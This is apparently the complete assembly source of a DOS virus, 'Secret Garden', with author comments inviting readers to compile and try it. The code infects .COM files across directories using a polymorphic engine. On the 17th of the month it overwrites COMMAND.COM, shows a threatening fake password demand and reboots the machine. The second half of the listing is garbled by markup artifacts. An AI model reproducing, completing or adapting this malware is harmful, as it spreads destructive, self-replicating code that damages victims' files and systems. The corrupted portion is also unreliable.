

; Welcome to the [Secret Garden] virus!!!
; This virus was written by Nipple!!!!
; Yeeee...This is pretty good virus....try it :-)
; To compile it you will need Muta Gen ,if you don't have it....you should
; get it ... It is GOOOOODDDDD!!!!!!!
; This virus will teach you to use 4DOS...Because 4DOS is something really
; really goooooddddddd.......... ( Don't tell me about Windows because on
; "my" XT i can't start them ... but if u want fight...X-Windows works
; just fine on "my" DEC 5000 :-) )
;
; Two Magic commands are:
;      TASM SECRET
;      TLINK /T SECRET MUTAGEN


MGEN_SIZE       equ     1193

MAX_INFECT      equ     3


extrn   _MUTAGEN:near

code    segment byte    public  'code'
	org     100h
        assume  cs:code,ds:code,es:code,ss:code

carrier:
       jmp      start
       db       0ch
start:
       call     next
next:
       pop      bp
       sub      bp,offset next

; ARE WE GOING TO START IT OR WHAT?

       mov      ah, 2ah
       int      21h
       cmp      dl, 17
       jnz      NextTime

; SET NEW FILE ATTRIBUTS FOR COMMAND.COM
       mov      ax, 4301h
       mov      cx, 20h
       lea      dx, [bp+offset CommandCOM]
       int      21h

; OPEN COMMAND.COM
       mov      ax, 3d02h
       lea      dx, [bp+offset CommandCOM]
       int      21h
       mov      bx, ax

; WRITE THIS RESET SHIT INSIDE
       mov      ah, 40h
       mov      cx, offset NextTime - offset BeginReset
       lea      dx, [bp+offset BeginReset]
       int      21h

; SET CURSOR
       mov      ah, 2
       mov      bh, 0
       mov      dx, 0
       int      10h

; WRITE MESSAGE
       mov      ah, 09h
       lea      dx, [bp+offset Warning1]
       int      21h

StillEnter:
       mov      ah, 0ch
       mov      al, 07h
       int      21h
       cmp      al, 0dh
       jnz      StillEnter

       mov      ah, 9h
       lea      dx, [bp+offset FuckYou]

       int      21h
       int      21h

BeginReset:
; RESET COMPUTER
       mov      ax, 0040h
       mov      ds, ax
       mov      bx, 1234h
       mov      word ptr cs:[0072h], bx

       db          0eah
       dw          0
       dw          0ffffh

NextTime:

; IN WHAT DIRECTORY ARE WE?
       mov      dl, 0000h
       mov      ah, 47h
       lea      si, [bp+offset origdir+1]
       int      21h

; SET NEW DTA
       mov      ah, 1ah
       lea      dx, [bp+offset newDTA]
       int      21h

; RESTORE COM FILE
;     di <- si="" mov="" di,="" 100h="" lea="" si,="" [bp+offset="" old3]="" movsw="" movsw="" thisisloop:="" lea="" dx,="" [bp+offset="" commask]="" call="" infect="" ;="" enough="" infected="" files?="" cmp="" byte="" ptr="" [bp+offset="" n_infect],="" max_infect="" jae="" goaway="" ;="" cd..="" mov="" ah,="" 3bh="" lea="" dx,="" [bp+offset="" godown]="" int="" 21h="" jnc="" thisisloop="" goaway:="" ;="" go="" to="" old="" directory="" mov="" ah,="" 3bh="" lea="" dx,="" [bp+offset="" origdir+1]="" int="" 21h="" ;="" set="" dta="" to="" default="" mov="" dx,="" 0080h="" mov="" ah,="" 1ah="" int="" 21h="" return:="" ;="" return="" to="" orginal="" file="" mov="" bp,="" 100h="" jmp="" bp="" ;="" first="" bytes="" old3="" db="" 0cdh,="" 20h="" ,0h="" ,0h="" infect:="" ;="" find="" first="" mov="" cx,="" 0007h="" mov="" ah,4eh="" findnext:="" int="" 21h="" jnc="" nothingnew="" ret="" nothingnew:="" ;="" is="" it="" command.com="" !!="" mov="" ah,4fh="" cmp="" word="" ptr="" [bp+newdta+35],="" 'dn'="" jz="" findnext="" ;="" is="" it="" 4dos.com="" !!="" cmp="" word="" ptr="" [bp+newdta+31],="" 'od'="" jz="" findnext="" ;="" read="" file="" attributs="" mov="" ax,="" 4300h="" lea="" dx,="" [bp+offset="" newdta+30]="" int="" 21h="" mov="" word="" ptr="" [bp+offset="" f_attr],="" cx="" ;="" set="" new="" file="" attributs="" mov="" ax,="" 4301h="" mov="" cx,="" 20h="" int="" 21h="" ;="" open="" file="" mov="" ax,="" 3d02h="" lea="" dx,="" [bp+newdta+30]="" int="" 21h="" mov="" bx,="" ax="" ;="" read="" mov="" cx,="" 001ah="" mov="" ah,="" 003fh="" lea="" dx,="" [bp+offset="" readbuffer]="" int="" 21h="" ;="" set="" pointer="" to="" the="" end="" of="" file="" mov="" ax,="" 4202h="" xor="" cx,="" cx="" cwd="" int="" 21h="" cmp="" word="" ptr="" [bp+offset="" readbuffer],="" 'zm'="" jz="" jmp_close="" ;="" is="" this="" file="" infected?!!!="" cmp="" byte="" ptr="" [bp+offset="" readbuffer+3],="" 0ch="" jnz="" skipp="" jmp_close:="" jmp="" close="" skipp:="" ;="" store="" first="" 4="" bytes="" of="" file="" lea="" si,="" [bp+offset="" readbuffer]="" lea="" di,="" [bp+offset="" old3]="" movsw="" movsw="" ;="" count="" address="" sub="" ax,="" 0003h="" mov="" word="" ptr="" [bp+offset="" readbuffer+1],="" ax="" ;="" put="" jmp="" command="" mov="" dl,="" 00e9h="" mov="" byte="" ptr="" [bp+offset="" readbuffer],="" dl="" mov="" byte="" ptr="" [bp+offset="" readbuffer+3],="" 0ch="" ;="" save="" file="" time="" &="" date="" mov="" ax,="" 5700h="" int="" 21h="" mov="" word="" ptr="" [bp+offset="" f_time],="" cx="" mov="" word="" ptr="" [bp+offset="" f_date],="" dx="" ;="" mutagen="" calling="" routine="" mov="" dx,="" [bp+offset="" readbuffer+1]="" add="" dx,="" 103h="" mov="" cx,="" virus_size="" lea="" di,="" [bp+virus_end+80h]="" lea="" si,="" [bp+offset="" start]="" call="" _mutagen="" ;="" write="" virus="" lea="" dx,="" [bp+offset="" virus_end+80h]="" mov="" ah,="" 40h="" int="" 21h="" mov="" ax,="" 4200h="" xor="" cx,="" cx="" cwd="" int="" 21h="" ;="" write="" first="" 4="" bytes="" mov="" cx,="" 0004h="" mov="" ah,="" 40h="" lea="" dx,="" [bp+offset="" readbuffer]="" int="" 21h="" ;="" restore="" time="" &="" date="" mov="" ax,="" 5701h="" mov="" cx,="" word="" ptr="" [bp+offset="" f_time]="" mov="" dx,="" word="" ptr="" [bp+offset="" f_date]="" int="" 21h="" ;="" inc="" counter="" of="" infection="" inc="" byte="" ptr="" [bp+offset="" n_infect]="" close:="" ;="" close="" file="" mov="" ah,="" 3eh="" int="" 21h="" ;="" restore="" attributs="" lea="" dx,="" [bp+offset="" newdta+30]="" mov="" cx,="" word="" ptr="" [bp+offset="" f_attr]="" mov="" ax,="" 4301h="" int="" 21h="" ;="" find="" next="" mov="" ah,="" 4fh="" jmp="" findnext="" commask="" db="" '*.com',0="" godown="" db="" '..',0="" commandcom="" db="" 'c:\command.com',0="" logo="" db="" '="" [secret="" garden]="" by="" nipple="" '="" msg1="" db="" 'in="" my="" secret="" garden'="" msg2="" db="" 'i',27h,'am="" looking="" for="" the="" perfect="" flower'="" warning1="" db="" 07h,'i="" am="" going="" to="" fuck="" your="" hard="" disk="" if="" you="" don',27h,'t="" type="" the="" right="" password.',13,10="" warning2="" db="" 'don',27h,'t="" turn="" off="" your="" computer="" because="" i="" already="" fucked="" your="" hard="" disk',13,10="" warning3="" db="" 'and="" i="" will="" fix="" it="" only="" if="" you="" enter="" the="" right="" password!!!',13,10="" warning4="" db="" '="" password="" is:',07h,'$'="" fuckyou="" db="" '="" fuck="" you!!!="" ha="" ha="" ha="" ha!!!',07h,'$'="" f_attr="" dw="" 0="" f_time="" dw="" 0="" f_date="" dw="" 0="" n_infect="" db="" 0="" newdta="" db="" 43="" dup="" (?)="" readbuffer="" db="" 1ah="" dup="" (?)="" origdir="" db="" 65="" dup="" (?)="" virus_end="" equ="" $="" +="" mgen_size="" virus_size="" equ="" virus_end="" -="" offset="" start="" code="" ends="" end="" carrier=""></->